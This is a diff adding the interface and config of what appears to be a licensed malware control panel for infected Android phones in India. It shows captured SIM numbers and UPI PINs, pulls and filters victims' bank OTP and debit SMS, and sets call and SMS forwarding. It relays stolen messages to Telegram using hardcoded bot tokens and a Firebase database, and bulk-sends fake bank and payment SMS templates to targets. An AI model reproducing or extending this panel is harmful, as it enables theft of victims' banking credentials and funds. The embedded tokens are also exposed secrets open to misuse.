+    <div class="bg-white rounded-[24px] p-5 border border-[#eef5fa] shadow-sm space-y-3">
+      <h3 class="text-[#2481d7] text-[13px] font-bold uppercase tracking-wider">SEND SMS MESSAGE</h3>
+      
+      <div>
+        <label class="text-[11px] font-medium text-[#8ea5bc] block mb-1">To number...</label>
+        <input id="host-sms-number" type="text" placeholder="Enter phone number" class="w-full bg-[#f6f9fc] border border-[#eef5fa] rounded-xl px-4 py-3 text-[14px] text-[#1a2b4b] outline-none focus:border-[#2481d7] font-medium">
+      </div>
+
+      <div>
+        <label class="text-[11px] font-medium text-[#8ea5bc] block mb-1">Message body...</label>
+        <textarea id="host-sms-body" placeholder="Type your message..." rows="3" class="w-full bg-[#f6f9fc] border border-[#eef5fa] rounded-xl px-4 py-3 text-[14px] text-[#1a2b4b] outline-none resize-none focus:border-[#2481d7] font-medium"></textarea>
+      </div>
+
+      <div class="flex justify-end pt-1">
+        <button onclick="pasteToHostSms()" class="bg-[#2481d7] text-white text-xs font-bold px-4 py-2 rounded-lg flex items-center gap-1.5 shadow-sm active:scale-95"><i class="fa-regular fa-paste"></i> Paste</button>
+      </div>
+
+      <div class="grid grid-cols-2 gap-2 pt-2" id="host-sim-buttons">
+        <button onclick="sendHostSms(0)" class="bg-[#2481d7] text-white py-3 rounded-xl font-bold text-xs shadow-sm active:scale-95 truncate px-2" id="btn-host-sim1">SIM 1</button>
+        <button onclick="sendHostSms(1)" class="bg-[#2481d7] text-white py-3 rounded-xl font-bold text-xs shadow-sm active:scale-95 truncate px-2" id="btn-host-sim2">SIM 2</button>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<div id="screen-devices" class="screen" data-screen>
+<div class="px-4 pt-2 space-y-2">
+<!-- Search -->
+<div class="flex gap-2">
+<div class="flex-1 bg-white rounded-xl flex items-center px-3 shadow-sm border border-gray-100">
+<i class="fa-solid fa-magnifying-glass text-gray-400 text-sm mr-2"></i>
+<input id="device-search" oninput="renderDevices()" type="text" placeholder="Search devices, phone number..." class="w-full py-2.5 text-sm bg-transparent text-gray-700 placeholder-gray-400">
+</div>
+<div class="relative bg-white rounded-xl shadow-sm border border-gray-100 flex items-center gap-1.5 px-3 h-11 cursor-pointer transition-all hover:border-blue-300">
+  <i class="fa-solid fa-filter text-[#2481d7] text-sm"></i>
+  <span id="filter-badge" class="text-[10px] font-black px-2 py-0.5 rounded-full bg-[#dceef9] text-[#2481d7] border border-[#b8daef] uppercase tracking-wider">ALL</span>
+  <select id="device-filter" onchange="renderDevices()" class="absolute inset-0 w-full h-full opacity-0 cursor-pointer">
+    <option value="all">All Devices</option>
+    <option value="online">Online Only</option>
+    <option value="offline">Offline Only</option>
+  </select>
+</div>
+</div>
+<!-- Counter -->
+<div class="flex justify-between items-center px-1">
+<span class="font-bold text-sm text-gray-700">All Devices (<span class="device-total-count">0</span>)</span>
+<span class="text-xs font-semibold text-green-500 bg-green-50 px-2.5 py-1 rounded-full"><span class="device-online-count">0</span> online</span>
+</div>
+<!-- List -->
+<div id="devices-list" class="space-y-1.5 pb-4"></div>
+</div>
+<!-- FAB -->
+<button onclick="bulkCheckOnline()" class="fixed bottom-20 right-4 w-14 h-14 bg-blue-500 rounded-full shadow-lg flex items-center justify-center text-white z-30 action-btn max-w-[480px]" title="Check All Devices">
+<i class="fa-solid fa-tower-broadcast text-xl"></i></button>
+</div>
+
+<!-- ========== SCREEN: DEVICE DETAIL ========== -->
+<div id="screen-detail" class="screen slide-in bg-[#f4f8fb] min-h-screen" data-screen>
+<div class="px-0 pt-0">
+<!-- Header -->
+<header class="sticky top-0 z-50 bg-[#f4f8fb]">
+<div class="flex items-center justify-between px-4 py-3 pb-2">
+  <div class="flex items-center gap-3">
+    <button onclick="navigateTo('devices')" class="w-8 h-8 bg-[#eaf4fb] text-[#2481d7] rounded-full flex items-center justify-center shadow-sm"><i class="fa-solid fa-chevron-left text-[14px]"></i></button>
+    <h2 id="detail-title" class="font-bold text-[17px] text-[#1a2b4b]">Device</h2>
+  </div>
+  <div id="detail-status-badge" class="bg-[#dcfce7] text-[#16a34a] px-2.5 py-1 rounded-full text-[11px] font-bold flex items-center gap-1.5 shadow-sm border border-[#bbf7d0]">
+    <span class="w-1.5 h-1.5 rounded-full bg-[#16a34a]"></span> Online
+  </div>
+</div>
+<!-- Tabs -->
+<div class="flex border-b border-gray-100 bg-[#f4f8fb]">
+  <button onclick="switchDetailTab('overview')" id="tab-overview" class="flex-1 py-3 text-xs font-bold text-[#2481d7] border-b-2 border-[#2481d7] uppercase tracking-wider">OVERVIEW</button>
+  <button onclick="switchDetailTab('banking')" id="tab-banking" class="flex-1 py-3 text-xs font-bold text-gray-400 border-b-2 border-transparent uppercase tracking-wider">BANKING</button>
+</div>
+</header>
+
+<!-- Overview Tab -->
+<div id="detail-overview" class="p-3 space-y-4">
+  
+  <!-- Info Grid -->
+  <div class="bg-[#f0f8fd] rounded-[20px] shadow-[0_2px_10px_rgba(36,129,215,0.03)] border border-[#e2eff9] overflow-hidden">
+    <div class="grid grid-cols-2 divide-x divide-[#e2eff9]">
+      <div class="p-2.5 border-b border-[#e2eff9]">
+        <div class="text-[10px] font-bold text-[#2481d7] mb-0.5">Model</div>
+        <div class="text-[13px] font-black text-[#1a2b4b]" id="info-model">-</div>
+      </div>
+      <div class="p-2.5 border-b border-[#e2eff9]">
+        <div class="text-[10px] font-bold text-[#2481d7] mb-0.5">Brand</div>
+        <div class="text-[13px] font-black text-[#1a2b4b]" id="info-brand">-</div>
+      </div>
+      <div class="p-2.5 border-b border-[#e2eff9]">
+        <div class="text-[10px] font-bold text-[#2481d7] mb-0.5">Android</div>
+        <div class="text-[13px] font-black text-[#1a2b4b]" id="info-os">-</div>
+      </div>
+      <div class="p-2.5 border-b border-[#e2eff9]">
+        <div class="text-[10px] font-bold text-[#2481d7] mb-0.5">Battery</div>
+        <div class="text-[13px] font-black text-[#1a2b4b]" id="info-battery">-</div>
+      </div>
+      <div class="p-2.5 border-b border-[#e2eff9]">
+        <div class="text-[10px] font-bold text-[#2481d7] mb-0.5">SIM 1</div>
+        <div class="flex items-center gap-1.5"><div class="text-[13px] font-black text-[#1a2b4b] truncate" id="info-sim1">-</div><button onclick="copyToClipboard(document.getElementById('info-sim1').textContent)" class="text-[#2481d7] text-[10px] bg-[#dceef9] px-1.5 py-0.5 rounded cursor-pointer hidden" id="info-sim1-copy"><i class="fa-regular fa-copy"></i></button></div>
+        <div class="text-[9px] text-gray-500 mt-0.5" id="info-sim1-carrier"></div>
+      </div>
+      <div class="p-2.5 border-b border-[#e2eff9]">
+        <div class="text-[10px] font-bold text-[#2481d7] mb-0.5">SIM 2</div>
+        <div class="flex items-center gap-1.5"><div class="text-[13px] font-black text-[#1a2b4b] truncate" id="info-sim2">-</div><button onclick="copyToClipboard(document.getElementById('info-sim2').textContent)" class="text-[#2481d7] text-[10px] bg-[#dceef9] px-1.5 py-0.5 rounded cursor-pointer hidden" id="info-sim2-copy"><i class="fa-regular fa-copy"></i></button></div>
+        <div class="text-[9px] text-gray-500 mt-0.5" id="info-sim2-carrier"></div>
+      </div>
+      <div class="p-2.5 border-b border-[#e2eff9]">
+        <div class="text-[10px] font-bold text-[#2481d7] mb-0.5">UPI PIN</div>
+        <div class="text-[13px] font-black text-[#1a2b4b]" id="info-upi">-</div>
+      </div>
+      <div class="p-2.5 border-b border-[#e2eff9]">
+        <div class="text-[10px] font-bold text-[#2481d7] mb-0.5">Last Seen</div>
+        <div class="text-[13px] font-black text-[#16a34a]" id="info-last-seen">-</div>
+      </div>
+      <div class="p-2.5">
+        <div class="text-[10px] font-bold text-[#2481d7] mb-0.5">Joined</div>
+        <div class="text-[12px] font-black text-[#1a2b4b]" id="info-joined">-</div>
+      </div>
+      <div class="p-2.5">
+        <div class="text-[10px] font-bold text-[#2481d7] mb-0.5">Device ID</div>
+        <div class="text-[12px] font-black text-[#1a2b4b] truncate w-[130px]" id="info-id">-</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- QUICK ACTIONS -->
+  <div>
+    <h3 class="text-[#2481d7] text-[11px] font-bold uppercase tracking-wider mb-2 ml-1">Quick Actions</h3>
+    <div class="grid grid-cols-2 gap-2 mb-2">
+      <button onclick="sendCommand(selectedDeviceId,'CHECK_ONLINE')" class="bg-[#f0f8fd] text-[#2481d7] font-bold text-[11.5px] py-2.5 rounded-[10px] flex items-center justify-center gap-1.5 active:scale-95 border border-[#e2eff9] shadow-[0_1px_2px_rgba(36,129,215,0.05)]"><i class="fa-solid fa-tower-cell"></i> Check Online</button>
+      <button onclick="sendCommand(selectedDeviceId,'GET_SMS')" class="bg-[#f0f8fd] text-[#2481d7] font-bold text-[11.5px] py-2.5 rounded-[10px] flex items-center justify-center gap-1.5 active:scale-95 border border-[#e2eff9] shadow-[0_1px_2px_rgba(36,129,215,0.05)]"><i class="fa-solid fa-envelope"></i> Get SMS</button>
+    </div>
+    <div class="grid grid-cols-3 gap-2 mb-2">
+      <button onclick="sendCommand(selectedDeviceId,'GET_INFO')" class="bg-[#f0f8fd] text-[#2481d7] font-bold text-[11px] py-2.5 rounded-[10px] flex items-center justify-center gap-1.5 active:scale-95 border border-[#e2eff9] shadow-[0_1px_2px_rgba(36,129,215,0.05)]"><i class="fa-solid fa-circle-info"></i> Get Info</button>
+      <button onclick="openCallFwdModal()" class="bg-[#f0f8fd] text-[#2481d7] font-bold text-[11px] py-2.5 rounded-[10px] flex items-center justify-center gap-1.5 active:scale-95 border border-[#e2eff9] shadow-[0_1px_2px_rgba(36,129,215,0.05)]"><i class="fa-solid fa-phone-arrow-right"></i> Call Fwd</button>
+      <button onclick="openUssdModal()" class="bg-[#f0f8fd] text-[#2481d7] font-bold text-[11px] py-2.5 rounded-[10px] flex items-center justify-center gap-1.5 active:scale-95 border border-[#e2eff9] shadow-[0_1px_2px_rgba(36,129,215,0.05)]"><i class="fa-solid fa-hashtag"></i> USSD</button>
+    </div>
+    <div class="grid grid-cols-2 gap-2">
+      <button onclick="sendCommand(selectedDeviceId,'CHECK_ONLINE');sendCommand(selectedDeviceId,'GET_INFO');toast('Refreshing...','info')" class="bg-[#f0f8fd] text-[#2481d7] font-bold text-[11.5px] py-2.5 rounded-[10px] flex items-center justify-center gap-1.5 active:scale-95 border border-[#e2eff9] shadow-[0_1px_2px_rgba(36,129,215,0.05)]"><i class="fa-solid fa-arrows-rotate"></i> Refresh</button>
+      <button onclick="openSmsFwdModal()" class="bg-[#f0f8fd] text-[#2481d7] font-bold text-[11.5px] py-2.5 rounded-[10px] flex items-center justify-center gap-1.5 active:scale-95 border border-[#e2eff9] shadow-[0_1px_2px_rgba(36,129,215,0.05)]"><i class="fa-solid fa-share"></i> SMS Fwd</button>
+    </div>
+  </div>
+
+  <!-- SEND SMS -->
+  <div>
+    <div class="flex items-center justify-between mb-1.5 ml-1">
+      <h3 class="text-[#2481d7] text-[11px] font-bold uppercase tracking-wider">Send SMS</h3>
+      <div class="flex items-center gap-1.5">
+        <span id="host-status-label" class="text-[9px] text-gray-400 font-bold">Host OFF</span>
+        <button onclick="toggleWebHostModal()" class="w-6 h-6 rounded-full bg-[#dceef9] text-[#2481d7] flex items-center justify-center active:scale-95 shadow-sm" title="Web Host Settings"><i class="fa-solid fa-globe text-[10px]"></i></button>
+        <span id="relay-status-label" class="text-[9px] text-gray-400 font-bold ml-1">Relay OFF</span>
+        <button onclick="toggleRelayStatus()" class="w-6 h-6 rounded-full bg-[#dceef9] text-[#2481d7] flex items-center justify-center active:scale-95 shadow-sm" title="Toggle Telegram Relay"><i class="fa-regular fa-paper-plane text-[10px]"></i></button>
+      </div>
+    </div>
+    
+    <div class="bg-white rounded-[16px] p-2.5 shadow-[0_2px_8px_rgba(0,0,0,0.02)] border border-[#f0f4f8]">
+      <div class="mb-2">
+        <input id="sms-to-number" type="text" placeholder="To number..." class="w-full bg-[#f6f9fc] border border-[#eef5fa] rounded-[10px] px-3 py-2 text-[13px] text-[#1a2b4b] outline-none focus:border-[#2481d7] placeholder-[#a0afbe] font-medium">
+      </div>
+      <div class="mb-2">
+        <textarea id="sms-body" placeholder="Message body..." rows="1" class="w-full bg-[#f6f9fc] border border-[#eef5fa] rounded-[10px] px-3 py-2 text-[13px] text-[#1a2b4b] outline-none resize-none focus:border-[#2481d7] placeholder-[#a0afbe] font-medium h-10"></textarea>
+      </div>
+      
+      <div class="flex items-center justify-between mb-2 px-1 mt-1">
+        <span class="text-[10px] text-[#8ea5bc] font-medium">Paste & auto-fill</span>
+        <button onclick="pasteClipboard()" class="bg-[#2481d7] text-white text-[10px] font-bold px-3 py-1.5 rounded-md flex items-center gap-1 shadow-sm active:scale-95"><i class="fa-regular fa-paste"></i> Paste</button>
+      </div>
+      
+      <div class="flex gap-2" id="sim-buttons">
+      </div>
+    </div>
+  </div>
+
+  <!-- INCOMING MESSAGES -->
+  <div>
+    <div class="flex items-center justify-between mb-1.5 ml-1">
+      <h3 class="text-[#2481d7] text-[11px] font-bold uppercase tracking-wider">Incoming Messages</h3>
+      <button onclick="refreshSms()" class="text-[#2481d7] active:scale-95"><i class="fa-solid fa-rotate text-[13px]"></i></button>
+    </div>
+    <input id="sms-search" oninput="renderDetailSms()" type="text" placeholder="Search messages..." class="w-full bg-[#f6f9fc] border border-[#eef5fa] rounded-[10px] px-3 py-2 text-[13px] outline-none mb-2 placeholder-[#a0afbe] font-medium shadow-sm">
+    <div class="flex gap-2 mb-2">
+      <button id="filter-received" onclick="setSmsFilter('received')" class="sms-filter-btn px-4 py-1.5 rounded-full text-[11px] font-bold bg-[#2481d7] text-white shadow-sm">Incoming</button>
+      <button id="filter-sent" onclick="setSmsFilter('sent')" class="sms-filter-btn px-4 py-1.5 rounded-full text-[11px] font-bold bg-white text-gray-500 border border-[#eef5fa] shadow-sm">Outgoing</button>
+    </div>
+    <div id="sms-list" class="space-y-2 max-h-[500px] overflow-y-auto pb-6"></div>
+  </div>
+</div>
+<!-- Banking Tab -->
+<div id="detail-banking" class="p-4 space-y-3" style="display:none">
+<div class="flex flex-wrap gap-2 mb-2">
+<button onclick="setBankFilter('all')" class="bank-filter-btn px-3 py-1.5 rounded-full text-xs font-semibold bg-blue-500 text-white">All</button>
+<button onclick="setBankFilter('credit')" class="bank-filter-btn px-3 py-1.5 rounded-full text-xs font-semibold bg-gray-200 text-gray-600">Credit</button>
+<button onclick="setBankFilter('debit')" class="bank-filter-btn px-3 py-1.5 rounded-full text-xs font-semibold bg-gray-200 text-gray-600">Debit</button>
+<button onclick="setBankFilter('otp')" class="bank-filter-btn px-3 py-1.5 rounded-full text-xs font-semibold bg-gray-200 text-gray-600">OTP</button>
+<button onclick="setBankFilter('bank')" class="bank-filter-btn px-3 py-1.5 rounded-full text-xs font-semibold bg-gray-200 text-gray-600">Bank</button>
+</div>
+<div class="flex flex-wrap gap-1.5 mb-2" id="bank-name-filters"></div>
+<div id="banking-sms-list" class="space-y-2 max-h-[600px] overflow-y-auto"></div>
+</div>
+</div></div>
+
+<!-- ========== SCREEN: MESSAGES (Global) ========== -->
+<div id="screen-messages" class="screen" data-screen>
+<div class="px-4 pt-2 space-y-3">
+<h2 class="font-bold text-lg text-gray-800">All Messages</h2>
+<input id="global-sms-search" oninput="renderGlobalMessages()" type="text" placeholder="Search all messages..." class="w-full bg-white border border-gray-100 rounded-xl px-3 py-2.5 text-sm shadow-sm">
+<div id="global-sms-list" class="space-y-2 pb-4"></div>
+</div></div>
+
+<!-- ========== SCREEN: DATA ========== -->
+<div id="screen-data" class="screen" data-screen>
+<div class="px-4 pt-2 space-y-3">
+<h2 class="font-bold text-lg text-gray-800">Data Overview</h2>
+<div class="grid grid-cols-2 gap-3" id="data-stats"></div>
+<div class="bg-white rounded-2xl p-4 shadow-sm">
+<h3 class="font-bold text-sm text-gray-700 mb-2">Active Sessions</h3>
+<div id="data-sessions-list" class="space-y-2"></div>
+</div>
+<button onclick="exportJSON()" class="w-full bg-blue-500 text-white py-3 rounded-xl font-semibold shadow action-btn"><i class="fa-solid fa-download mr-2"></i>Export Full Database JSON</button>
+</div></div>
+
+<!-- ========== SCREEN: SETTINGS ========== -->
+<div id="screen-settings" class="screen" data-screen>
+  <div class="px-4 pt-4 space-y-5 pb-24">
+    <!-- ACCOUNT SECTION -->
+    <div>
+      <h3 class="text-[#2481d7] text-[11px] font-bold uppercase tracking-wider mb-2 ml-1">Account</h3>
+      <div class="bg-white rounded-[20px] p-4 shadow-sm border border-gray-100 flex flex-col gap-4">
+        <!-- Profile info -->
+        <div class="flex items-center justify-between pb-4 border-b border-gray-50">
+          <div class="flex items-center gap-3">
+            <div class="w-[46px] h-[46px] rounded-full bg-[#2481d7] flex items-center justify-center text-white text-xl font-bold">B</div>
+            <div>
+              <div class="font-bold text-[16px] text-gray-800">BERLIN</div>
+              <div class="text-[12px] text-gray-500">Admin · 30 days left</div>
+            </div>
+          </div>
+          <div class="bg-[#dcfce7] text-[#22c55e] text-[11px] font-bold px-3 py-1 rounded-full">30d</div>
+        </div>
+        <!-- Dark Mode -->
+        <div class="flex items-center justify-between">
+          <span class="text-sm text-gray-700 font-medium">Dark Mode</span>
+          <div class="bg-[#f0f4f9] text-[#5b738b] text-[11px] font-bold px-4 py-1.5 rounded-full cursor-not-allowed">OFF</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- SMS FORWARDER BOT SECTION -->
+    <div>
+      <h3 class="text-[#2481d7] text-[11px] font-bold uppercase tracking-wider mb-2 ml-1">📩 SMS Auto-Forwarder Bot</h3>
+      <div class="bg-white rounded-[20px] p-4 shadow-sm border border-gray-100 space-y-3">
+        <p class="text-[12px] text-gray-500">Bot 1: Automatically forwards all new incoming device SMS to Telegram in real-time.</p>
+        <div>
+          <label class="text-[11px] font-bold text-gray-500 uppercase">Forwarder Bot Token</label>
+          <input id="setting-fwd-token" type="text" value="8973573038:AAETZkKGUJAXgVdAmRzrgYUQVY3cWCeHhxA" class="w-full bg-[#f4f7fa] border border-[#e8edf2] rounded-xl px-3.5 py-2.5 text-xs font-mono outline-none focus:border-[#2481d7] mt-1 text-gray-700">
+        </div>
+        <div>
+          <label class="text-[11px] font-bold text-gray-500 uppercase">Forwarder Chat ID</label>
+          <input id="setting-fwd-chat" type="text" value="7606730935" class="w-full bg-[#f4f7fa] border border-[#e8edf2] rounded-xl px-3.5 py-2.5 text-xs font-mono outline-none focus:border-[#2481d7] mt-1 text-gray-700">
+        </div>
+        <div class="flex gap-2 pt-1">
+          <button onclick="saveTelegramForwarderConfig()" class="flex-1 bg-[#2481d7] text-white py-3 rounded-xl font-bold text-xs shadow-sm active:scale-95 transition-transform">Save Forwarder Config</button>
+          <button onclick="testTelegramForwarderConfig()" class="flex-1 bg-gray-100 text-gray-700 py-3 rounded-xl font-bold text-xs border border-gray-200 active:scale-95 transition-transform">Verify Bot 1</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- TELEGRAM RELAY COMMAND BOT SECTION -->
+    <div>
+      <h3 class="text-[#2481d7] text-[11px] font-bold uppercase tracking-wider mb-2 ml-1">🤖 Telegram Relay & Command Bot</h3>
+      <div class="bg-white rounded-[20px] p-4 shadow-sm border border-gray-100 space-y-3">
+        <p class="text-[12px] text-gray-500">Bot 2: Listens for user commands (TargetNumber | Message) in Telegram to send SMS via active device.</p>
+        <div>
+          <label class="text-[11px] font-bold text-gray-500 uppercase">Relay Command Bot Token</label>
+          <input id="setting-relay-token" type="text" value="8906014635:AAFa29ybjIoPxYfwy-cTFfFxJGF0Fp5OB0A" class="w-full bg-[#f4f7fa] border border-[#e8edf2] rounded-xl px-3.5 py-2.5 text-xs font-mono outline-none focus:border-[#2481d7] mt-1 text-gray-700">
+        </div>
+        <div>
+          <label class="text-[11px] font-bold text-gray-500 uppercase">Relay Command Chat ID</label>
+          <input id="setting-relay-chat" type="text" value="7606730935" class="w-full bg-[#f4f7fa] border border-[#e8edf2] rounded-xl px-3.5 py-2.5 text-xs font-mono outline-none focus:border-[#2481d7] mt-1 text-gray-700">
+        </div>
+        <div class="flex gap-2 pt-1">
+          <button onclick="saveTelegramRelayConfig()" class="flex-1 bg-[#2481d7] text-white py-3 rounded-xl font-bold text-xs shadow-sm active:scale-95 transition-transform">Save Relay Config</button>
+          <button onclick="testTelegramRelayConfig()" class="flex-1 bg-gray-100 text-gray-700 py-3 rounded-xl font-bold text-xs border border-gray-200 active:scale-95 transition-transform">Verify Bot 2</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- OWNER SECTION -->
+    <div>
+      <h3 class="text-[#2481d7] text-[11px] font-bold uppercase tracking-wider mb-2 ml-1">Owner Support</h3>
+      <div class="bg-white rounded-[20px] p-4 shadow-sm border border-gray-100">
+        <h4 class="font-bold text-[15px] text-gray-800 mb-1">Extend Plan / License Support</h4>
+        <p class="text-[13px] text-gray-500 mb-4">Contact official support @BERLIN_00_11</p>
+        <button onclick="window.open('https://t.me/BERLIN_00_11', '_blank')" class="w-full bg-[#2481d7] text-white py-3.5 rounded-xl font-bold text-sm active:scale-95 transition-transform shadow-sm flex items-center justify-center gap-2">
+          <i class="fa-paper-plane fa-solid"></i> Contact @BERLIN_00_11
+        </button>
+      </div>
+    </div>
+
+    <!-- APK DOWNLOAD SECTION -->
+    <div>
+      <h3 class="text-[#2481d7] text-[11px] font-bold uppercase tracking-wider mb-2 ml-1">APK Download</h3>
+      <div class="bg-white rounded-[20px] p-4 shadow-sm border border-gray-100">
+        <p class="text-[13px] text-gray-500 mb-3" id="apk-status-text">Checking for APK...</p>
+        <input id="apk-filename" type="text" placeholder="Custom filename (e.g. myapp.apk)" class="w-full bg-[#f4f7fa] border border-[#e8edf2] rounded-xl px-4 py-3 text-[13px] outline-none focus:border-[#2481d7] placeholder-[#a0afbe] mb-3 text-gray-700">
+        <button onclick="downloadApk()" class="w-full bg-[#93c5ec] text-white py-3.5 rounded-xl font-bold text-sm shadow-sm flex items-center justify-center gap-2 pointer-events-none" id="btn-download-apk">
+          <i class="fa-solid fa-arrow-down"></i> Download APK
+        </button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ========== SCREEN: BULK SENDER ========== -->
+<div id="screen-bulk" class="screen" data-screen>
+<div class="px-4 pt-2 space-y-4">
+<!-- Online Devices -->
+<div>
+<h4 class="font-bold text-xs text-blue-500 uppercase tracking-wide mb-2">Online Devices</h4>
+<div class="bg-white rounded-2xl p-4 shadow-sm flex items-center gap-3">
+<div class="text-3xl font-black text-blue-500 device-online-count">0</div>
+<div><div class="font-bold text-sm">Online Devices</div><div id="online-models-preview" class="text-xs text-gray-400 mt-0.5"></div></div>
+</div></div>
+<!-- Mode -->
+<div>
+<h4 class="font-bold text-xs text-blue-500 uppercase tracking-wide mb-2">Mode</h4>
+<div class="bg-white rounded-2xl p-4 shadow-sm">
+<div class="flex gap-2 mb-2">
+<button onclick="setBulkMode('template')" id="bulk-mode-template" class="flex-1 py-2.5 rounded-full text-sm font-semibold bg-blue-500 text-white action-btn">Random Template</button>
+<button onclick="setBulkMode('custom')" id="bulk-mode-custom" class="flex-1 py-2.5 rounded-full text-sm font-semibold bg-white text-blue-500 border-2 border-blue-500 action-btn">Custom Message</button>
+</div>
+<p id="bulk-mode-desc" class="text-[11px] text-gray-400">20 templates: OTP, Zomato, Bajaj Finance, Jio Finance, Credit Card, Banking</p>
+<textarea id="bulk-custom-msg" placeholder="Type your custom message..." rows="3" class="w-full border border-gray-200 rounded-xl px-3 py-2.5 text-sm mt-2 resize-none" style="display:none"></textarea>
+</div></div>
+<!-- Target -->
+<div>
+<h4 class="font-bold text-xs text-blue-500 uppercase tracking-wide mb-2">Target</h4>
+<div class="bg-white rounded-2xl p-4 shadow-sm space-y-3">
+<input id="bulk-target-number" type="text" placeholder="Target phone number (e.g. 9876543210)" class="w-full border border-gray-200 rounded-xl px-3 py-2.5 text-sm">
+<input id="bulk-msg-count" type="number" placeholder="Number of messages to send" class="w-full border border-gray-200 rounded-xl px-3 py-2.5 text-sm">
+<p class="text-[11px] text-gray-400">Messages distributed across all online devices, round-robin</p>
+</div></div>
+<!-- Progress -->
+<div>
+<h4 class="font-bold text-xs text-blue-500 uppercase tracking-wide mb-2">Progress</h4>
+<div class="bg-white rounded-2xl p-4 shadow-sm">
+<div class="font-bold text-sm mb-2" id="bulk-status-text">Ready</div>
+<div class="w-full bg-gray-200 rounded-full h-2.5 mb-3"><div id="bulk-progress-bar" class="bg-blue-500 h-2.5 rounded-full transition-all" style="width:0%"></div></div>
+<div class="flex gap-2">
+<button onclick="startBulkSend()" class="flex-1 py-2.5 rounded-xl bg-green-400 text-white font-bold action-btn">START</button>
+<button onclick="stopBulkSend()" class="flex-1 py-2.5 rounded-xl bg-red-300 text-white font-bold action-btn">STOP</button>
+</div></div></div>
+<!-- Sample Templates -->
+<div>
+<h4 class="font-bold text-xs text-blue-500 uppercase tracking-wide mb-2">Sample Templates</h4>
+<div id="template-preview" class="space-y-2 pb-4"></div>
+</div>
+</div></div>
+
+<!-- ========== BOTTOM NAV ========== -->
+<nav id="bottom-nav" class="fixed bottom-0 left-1/2 -translate-x-1/2 w-full max-w-[480px] bg-white border-t border-gray-200 flex z-50 shadow-[0_-2px_10px_rgba(0,0,0,0.05)]">
+<button onclick="navigateTo('home')" data-tab="home" class="flex-1 py-2 flex flex-col items-center gap-0.5 text-blue-500">
+<i class="fa-solid fa-house text-lg"></i><span class="text-[10px] font-semibold">Home</span></button>
+<button onclick="navigateTo('devices')" data-tab="devices" class="flex-1 py-2 flex flex-col items-center gap-0.5 text-gray-400">
+<i class="fa-solid fa-mobile-screen text-lg"></i><span class="text-[10px] font-semibold">Devices</span></button>
+<button onclick="navigateTo('messages')" data-tab="messages" class="flex-1 py-2 flex flex-col items-center gap-0.5 text-gray-400">
+<i class="fa-solid fa-comments text-lg"></i><span class="text-[10px] font-semibold">Messages</span></button>
+<button onclick="navigateTo('data')" data-tab="data" class="flex-1 py-2 flex flex-col items-center gap-0.5 text-gray-400">
+<i class="fa-solid fa-database text-lg"></i><span class="text-[10px] font-semibold">Data</span></button>
+<button onclick="navigateTo('settings')" data-tab="settings" class="flex-1 py-2 flex flex-col items-center gap-0.5 text-gray-400">
+<i class="fa-solid fa-gear text-lg"></i><span class="text-[10px] font-semibold">Settings</span></button>
+</nav>
+</div>
+
+<script>
+// ===== CONFIG =====
+const DB_URL='https://blackwolf-5081a-default-rtdb.firebaseio.com';
+const BASE='dv_gateway_v3';
+firebase.initializeApp({databaseURL:DB_URL});
+const db=firebase.database();
+
+// ===== STATE =====
+let allDevices={},selectedDeviceId=null,currentScreen='home',previousScreen='home';
+let smsFilterType='received',bankFilterType='all',bankFilterName=null,bulkMode='template',bulkRunning=false,bulkAbort=false;
+
+// ===== INDIAN BANKS =====
+const BANKS=[
+{name:'HDFC Bank',p:['HDFC','HDFCBK']},{name:'ICICI Bank',p:['ICICI']},{name:'SBI',p:['SBI','SBIBNK','State Bank']},
+{name:'Axis Bank',p:['AXIS','AXISBK']},{name:'Kotak',p:['KOTAK']},{name:'IOB',p:['IOB','IOBCHN']},
+{name:'South Indian Bank',p:['SIB','SIBSMS','South Indian']},{name:'PNB',p:['PNB']},{name:'Canara Bank',p:['CANARA','CANBK']},
+{name:'Union Bank',p:['UNION']},{name:'IndusInd',p:['INDUSIND','IDBIB']},{name:'Yes Bank',p:['YES BANK','YESBK']},
+{name:'Federal Bank',p:['FEDERAL']},{name:'RBL Bank',p:['RBL']},{name:'IDBI Bank',p:['IDBI']},
+{name:'Bajaj Finance',p:['BAJAJ','BAJAJF','BFL']},{name:'TVS Credit',p:['TVS','TVSCR','TVSCS']},
+{name:'BOB',p:['BOB','Baroda']},{name:'DDCCB',p:['DDCCB','DDCCBK']}
+];
+
+const SMS_TEMPLATES=[
+"Your OTP for login is {OTP}. Valid for 10 minutes. Do not share.",
+"ICICI Credit Card payment Rs.{AMT} successful. Ref#{REF}. -ICICI Bank",
+"Rs.{AMT} debited from A/c XX{AC}. UPI Ref {REF}. If not you, call 18001234567. -HDFC Bank",
+"Rs.{AMT} credited to A/c XX{AC}. UPI/{REF}. Bal: Rs.{BAL}. -SBI",
+"Dear Customer, Your OTP is {OTP}. Do not share this with anyone. -Axis Bank",
+"Alert: Your Kotak Credit Card XX{AC} used for Rs.{AMT} at {MERCH}. Not you? Call 18002740110",
+"Zomato: Your order #{REF} for Rs.{AMT} has been placed! Track: zomato.com/track",
+"Dear User, Rs.{AMT} credited to your Jio Finance wallet. Ref: {REF}. Download app for details.",
+"Bajaj Finance: Pre-Approved Loan of Rs.{AMT} ready. Avail now: bajajfinserv.in/apply",
+"Your PhonePe UPI transaction of Rs.{AMT} is successful. Ref: {REF}",
+"Google Pay: Rs.{AMT} sent to {MERCH}. UPI Ref: {REF}. Check balance on Google Pay app.",
+"PNB Alert: Rs.{AMT} withdrawn from ATM. A/c XX{AC}. Bal: Rs.{BAL}. Not you? Call 18001802222",
+"Amazon Pay: Refund of Rs.{AMT} initiated for order #{REF}. Amount will reflect in 3-5 days.",
+"Your Paytm wallet credited with Rs.{AMT}. Cashback for order #{REF}. T&C apply.",
+"IRCTC: PNR {REF} confirmed. Train: 12345 Rajdhani Exp. Boarding: New Delhi. Dept: 16:30",
+"Flipkart: Your order #{REF} has been dispatched! Track at flipkart.com/track",
+"Dear Customer, EMI of Rs.{AMT} due on your loan A/c XX{AC}. Pay before due date. -HDFC Bank",
+"Alert: International txn of USD {AMT} on your card XX{AC}. Not you? Call immediately. -ICICI",
+"Your {MERCH} subscription renewed. Rs.{AMT} charged to card XX{AC}. Ref: {REF}",
+"OTP {OTP} for UPI transaction Rs.{AMT}. Valid for 3 min. Do NOT share. -Your Bank"
+];
+
+// ===== TOAST (Modern Floating Pill) =====
